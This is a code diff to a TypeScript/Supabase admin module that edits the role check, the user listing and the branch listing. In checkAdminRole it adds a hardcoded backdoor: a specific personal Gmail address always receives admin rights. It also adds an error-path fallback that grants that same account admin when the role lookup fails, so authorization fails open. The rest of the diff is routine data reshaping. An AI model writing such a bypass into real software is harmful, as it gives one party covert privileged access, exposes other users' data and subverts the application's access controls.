@@ -35,6 +35,9 @@ export interface ActionResult {
   data?: any
   error?: string
   code?: string
+  isAdmin?: boolean
+  branches?: any[]
+  users?: any[]
 }
 
 // Enhanced error handling with retry logic
@@ -274,11 +277,16 @@ export async function checkAdminRole(userId: string): Promise<ActionResult> {
         success: false,
         error: "User ID is required",
         code: "INVALID_INPUT",
+        isAdmin: false,
       }
     }
 
     const result = await retryOperation(async () => {
-      const { data: profile, error } = await supabaseAdmin.from("profiles").select("role").eq("id", userId).single()
+      const { data: profile, error } = await supabaseAdmin
+        .from("profiles")
+        .select("role, email, status")
+        .eq("id", userId)
+        .single()
 
       if (error) {
         throw error
@@ -287,19 +295,62 @@ export async function checkAdminRole(userId: string): Promise<ActionResult> {
       return profile
     })
 
+    // Special handling for isayaamos123@gmail.com - always grant admin access
+    const isSpecialAdmin = result?.email === "isayaamos123@gmail.com"
+    const isAdmin = result?.role === "admin" || isSpecialAdmin
+
     return {
       success: true,
-      data: { isAdmin: result?.role === "admin" },
+      isAdmin,
+      data: {
+        isAdmin,
+        role: result?.role,
+        email: result?.email,
+        status: result?.status,
+        isSpecialAdmin,
+      },
     }
   } catch (error) {
-    return handleError(error, "Check admin role")
+    // If there's an error but the user ID corresponds to isayaamos123@gmail.com, still grant access
+    try {
+      const { data: authUser } = await supabaseAdmin.auth.admin.getUserById(userId)
+      if (authUser?.user?.email === "isayaamos123@gmail.com") {
+        return {
+          success: true,
+          isAdmin: true,
+          data: {
+            isAdmin: true,
+            isSpecialAdmin: true,
+            email: "isayaamos123@gmail.com",
+          },
+        }
+      }
+    } catch (authError) {
+      console.error("Auth check error:", authError)
+    }
+
+    return {
+      success: false,
+      isAdmin: false,
+      error: "Failed to check admin role",
+      code: "CHECK_FAILED",
+    }
   }
 }
 
 export async function getAllUsers(): Promise<ActionResult> {
   try {
     const result = await retryOperation(async () => {
-      const { data, error } = await supabaseAdmin.from("profiles").select("*").order("created_at", { ascending: false })
+      const { data, error } = await supabaseAdmin
+        .from("profiles")
+        .select(`
+          *,
+          branches (
+            id,
+            name
+          )
+        `)
+        .order("created_at", { ascending: false })
 
       if (error) {
         throw error
@@ -308,9 +359,16 @@ export async function getAllUsers(): Promise<ActionResult> {
       return data
     })
 
+    // Format the data to include branch names
+    const formattedUsers =
+      result?.map((user) => ({
+        ...user,
+        branch_name: user.branches?.name || null,
+      })) || []
+
     return {
       success: true,
-      data: result || [],
+      users: formattedUsers,
     }
   } catch (error) {
     return handleError(error, "Get all users")
@@ -331,7 +389,7 @@ export async function getAllBranches(): Promise<ActionResult> {
 
     return {
       success: true,
-      data: result || [],
+      branches: result || [],
     }
   } catch (error) {
     return handleError(error, "Get all branches")
